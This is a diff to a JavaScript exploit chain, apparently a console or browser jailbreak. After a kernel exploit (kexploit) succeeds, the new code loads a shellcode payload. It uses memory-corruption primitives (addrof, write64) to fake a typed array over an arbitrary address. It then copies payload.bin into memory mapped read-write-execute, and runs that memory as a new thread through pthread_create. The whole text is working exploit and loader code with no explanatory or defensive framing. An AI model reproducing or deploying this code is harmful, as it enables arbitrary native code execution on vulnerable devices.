@@ -1795,48 +1795,46 @@ function runBinLoader() {
   log("Awaiting payload...");
 }
 
-function runPayload(path) {
-  log(`loading ${path}`);
-  const xhr = new XMLHttpRequest();
-  xhr.open("GET", path);
-  xhr.responseType = "arraybuffer";
-  xhr.onreadystatechange = function () {
-    if (xhr.readyState === 4) {
-      if (xhr.status === 200) {
-        try {
-          const payload_buffer = chain.sysp("mmap", 0x0, 0x300000, 0x7, 0x41000, 0xffffffff, 0);
-          log(`payload buffer allocated at ${payload_buffer}`);
+function array_from_address(addr, size) {
+   var og_array = new Uint32Array(0x1000);
+    var og_array_i = mem.addrof(og_array).add(0x10);
+    mem.write64(og_array_i, addr);
+    mem.write32(og_array_i.add(0x8), size);
+    mem.write32(og_array_i.add(0xC), 0x1);
+    nogc.push(og_array);
+    return og_array;
+}
 
-          // Trick for 4 bytes padding
-          const padding = new Uint8Array(4 - ((xhr.response.byteLength % 4) % 4));
-          const tmp = new Uint8Array(xhr.response.byteLength + padding.byteLength);
-          tmp.set(new Uint8Array(xhr.response), 0);
-          tmp.set(padding, xhr.response.byteLength);
+function runPayload() {
 
-          const shellcode = new Uint32Array(tmp.buffer);
-          for (let i = 0; i < shellcode.length; i++) {
-            mem.write32(payload_buffer.add(0x100000 + i * 4), shellcode[i]);
-          }
-          log(`loaded ${xhr.response.byteLength} bytes for payload (+ ${padding.length} bytes padding)`);
-          chain.call_void(payload_buffer);
-          sysi("munmap", payload_buffer, 0x300000);
-        } catch (e) {
-          log(`error in runPayload: ${e.message}`);
-        }
-      } else if (xhr.status >= 400 && xhr.status < 600) {
-        log(`error retrieving payload, ${xhr.status}`);
-      }
-    }
-  };
-  xhr.onerror = function () {
-    log("network error");
-  };
-  xhr.send();
+const PROT_READ = 1;
+const PROT_WRITE = 2;
+const PROT_EXEC = 4;
+  
+fetch('./payload.bin').then(res => res.arrayBuffer()).then(arr => {
+   
+    const originalLength = arr.byteLength;
+    const paddingLength = (4 - (originalLength % 4)) % 4;
+    const paddedBuffer = new Uint8Array(originalLength + paddingLength);
+    paddedBuffer.set(new Uint8Array(arr), 0);
+    if (paddingLength) paddedBuffer.set(new Uint8Array(paddingLength), originalLength);
+    const shellcode = new Uint32Array(paddedBuffer.buffer);
+    const payload_buffer = chain.sysp('mmap', 0, paddedBuffer.length, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
+    const native_view = array_from_address(payload_buffer, shellcode.length);
+    native_view.set(shellcode);
+    chain.sys('mprotect', payload_buffer, paddedBuffer.length, PROT_READ | PROT_WRITE | PROT_EXEC);
+    const ctx = new Buffer(0x10);
+    const pthread = new Pointer();
+    pthread.ctx = ctx;
+
+    call_nze('pthread_create', pthread.addr, 0, payload_buffer, 0);
+});
+  
 }
 
 kexploit().then((success) => {
   if (success) {
-    // runPayload("./payload.bin");
+    // runPayload();
     runBinLoader();
   }
 });
